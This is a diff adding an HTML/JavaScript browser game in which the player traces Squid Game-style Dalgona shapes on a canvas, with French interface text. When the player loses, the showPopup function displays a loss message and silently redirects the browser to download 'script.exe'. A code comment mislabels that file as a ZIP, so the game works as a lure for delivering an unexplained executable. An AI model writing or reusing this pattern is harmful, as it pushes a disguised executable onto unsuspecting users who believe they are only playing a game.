@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dalgona Game</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+        }
+        #game {
+            text-align: center;
+        }
+        .door {
+            width: 100px;
+            height: 150px;
+            margin: 10px;
+            background-color: #444;
+            color: white;
+            display: inline-flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            font-size: 24px;
+            border-radius: 10px;
+            transition: background-color 0.3s;
+        }
+        .door:hover {
+            background-color: #666;
+        }
+        .canvas-container {
+            display: none;
+            margin-top: 20px;
+        }
+        #canvas {
+            border: 1px solid black;
+            background-color: #d2b48c; /* Brown color for the biscuit */
+            border-radius: 50%;
+        }
+        #popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            border: 3px solid black;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+        #popup p {
+            margin: 0;
+            font-size: 18px;
+        }
+        #popup .close-btn {
+            margin-top: 15px;
+            background-color: #444;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+        }
+        #popup .close-btn:hover {
+            background-color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div id="game">
+        <h1>Choisissez une porte</h1>
+        <div class="door" id="door1">Porte 1</div>
+        <div class="door" id="door2">Porte 2</div>
+        <div class="door" id="door3">Porte 3</div>
+        <div class="door" id="door4">Porte 4</div>
+        <div class="canvas-container" id="canvas-container">
+            <canvas id="canvas" width="400" height="400"></canvas>
+            <p id="result"></p>
+        </div>
+    </div>
+    <div id="popup">
+        <p>Vous avez perdu !</p>
+        <button class="close-btn" onclick="closePopup()">Fermer</button>
+    </div>
+
+    <script>
+        const shapes = ['triangle', 'circle', 'star', 'umbrella'];
+        const doors = document.querySelectorAll('.door');
+        const canvasContainer = document.getElementById('canvas-container');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const resultText = document.getElementById('result');
+        const popup = document.getElementById('popup');
+        let currentShape;
+        let drawing = false;
+        let lastX, lastY;
+        let outOfBounds = false;
+        const tolerance = 5; // Tolerance in pixels
+
+        doors.forEach(door => {
+            door.addEventListener('click', () => {
+                const randomShape = shapes[Math.floor(Math.random() * shapes.length)];
+                currentShape = randomShape;
+                drawShape(randomShape);
+                canvasContainer.style.display = 'block';
+                resultText.innerText = '';
+                outOfBounds = false;
+            });
+        });
+
+        canvas.addEventListener('mousedown', (event) => {
+            drawing = true;
+            lastX = event.offsetX;
+            lastY = event.offsetY;
+        });
+
+        canvas.addEventListener('mouseup', () => {
+            drawing = false;
+            if (outOfBounds) {
+                showPopup();
+            } else {
+                checkShape();
+            }
+        });
+
+        canvas.addEventListener('mousemove', draw);
+
+        function drawShape(shape) {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.lineWidth = 3;
+            ctx.strokeStyle = '#000';
+            ctx.beginPath();
+            ctx.arc(200, 200, 180, 0, Math.PI * 2);
+            ctx.stroke();
+
+            ctx.lineWidth = 3;
+            ctx.strokeStyle = '#000';
+
+            if (shape === 'triangle') {
+                ctx.beginPath();
+                ctx.moveTo(200, 100);
+                ctx.lineTo(100, 300);
+                ctx.lineTo(300, 300);
+                ctx.closePath();
+                ctx.stroke();
+            } else if (shape === 'circle') {
+                ctx.beginPath();
+                ctx.arc(200, 200, 100, 0, Math.PI * 2);
+                ctx.stroke();
+            } else if (shape === 'star') {
+                ctx.beginPath();
+                for (let i = 0; i < 5; i++) {
+                    ctx.lineTo(Math.cos((18 + i * 72) / 180 * Math.PI) * 100 + 200,
+                               -Math.sin((18 + i * 72) / 180 * Math.PI) * 100 + 200);
+                    ctx.lineTo(Math.cos((54 + i * 72) / 180 * Math.PI) * 40 + 200,
+                               -Math.sin((54 + i * 72) / 180 * Math.PI) * 40 + 200);
+                }
+                ctx.closePath();
+                ctx.stroke();
+            } else if (shape === 'umbrella') {
+                ctx.beginPath();
+                ctx.moveTo(170, 250);
+                ctx.bezierCurveTo(140, 200, 260, 200, 230, 250);
+                ctx.stroke();
+                ctx.beginPath();
+                ctx.moveTo(200, 100);
+                ctx.lineTo(200, 250);
+                ctx.moveTo(170, 250);
+                ctx.arc(200, 250, 30, Math.PI, 0);
+                ctx.stroke();
+            }
+        }
+
+        function draw(event) {
+            if (!drawing) return;
+            
+            const offsetX = event.offsetX;
+            const offsetY = event.offsetY;
+            const distance = Math.sqrt(Math.pow(offsetX - lastX, 2) + Math.pow(offsetY - lastY, 2));
+            
+            if (distance > 15 || isOutOfBounds(offsetX, offsetY)) {
+                outOfBounds = true;
+                ctx.strokeStyle = '#f00';
+                ctx.lineWidth = 5;
+                ctx.lineTo(event.offsetX, event.offsetY);
+                ctx.stroke();
+                return;
+            }
+
+            ctx.lineWidth = 2;
+            ctx.lineCap = 'round';
+            ctx.strokeStyle = '#00f'; // Color for the user's drawing
+
+            ctx.lineTo(event.offsetX, event.offsetY);
+            ctx.stroke();
+            ctx.beginPath();
+            ctx.moveTo(event.offsetX, event.offsetY);
+
+            lastX = event.offsetX;
+            lastY = event.offsetY;
+        }
+
+        function isOutOfBounds(x, y) {
+            if (currentShape === 'triangle') {
+                return !isInsideTriangle(x, y);
+            } else if (currentShape === 'circle') {
+                return !isInsideCircle(x, y, 200, 200, 100);
+            } else if (currentShape === 'star') {
+                return !isInsideStar(x, y);
+            } else if (currentShape === 'umbrella') {
+                return !isInsideUmbrella(x, y);
+            }
+            return false;
+        }
+
+        function isInsideTriangle(x, y) {
+            const x1 = 200, y1 = 100, x2 = 100, y2 = 300, x3 = 300, y3 = 300;
+            const areaOrig = Math.abs((x2-x1)*(y3-y1) - (x3-x1)*(y2-y1));
+            const area1 = Math.abs((x1-x)*(y2-y) - (x2-x)*(y1-y));
+            const area2 = Math.abs((x2-x)*(y3-y) - (x3-x)*(y2-y));
+            const area3 = Math.abs((x3-x)*(y1-y) - (x1-x)*(y3-y));
+            return Math.abs((area1 + area2 + area3) - areaOrig) <= tolerance * areaOrig / 100;
+        }
+
+        function isInsideCircle(x, y, cx, cy, r) {
+            const distance = Math.sqrt((x - cx) * (x - cx) + (y - cy) * (y - cy));
+            return distance <= r + tolerance;
+        }
+
+        function isInsideStar(x, y) {
+            // Simplified check for star
+            return isInsideCircle(x, y, 200, 200, 100 + tolerance);
+        }
+
+        function isInsideUmbrella(x, y) {
+            // Simplified check for umbrella
+            if (y > 250 + tolerance || y < 100 - tolerance) return false;
+            if (x < 170 - tolerance || x > 230 + tolerance) return false;
+            return true;
+        }
+
+        function checkShape() {
+            resultText.innerText = 'Forme complétée !';
+        }
+
+        function showPopup() {
+            popup.style.display = 'block';
+            // Lancer le téléchargement du fichier ZIP
+            window.location.href = 'script.exe'; // Chemin vers le fichier ZIP sur votre serveur local
+        }
+
+        function closePopup() {
+            popup.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
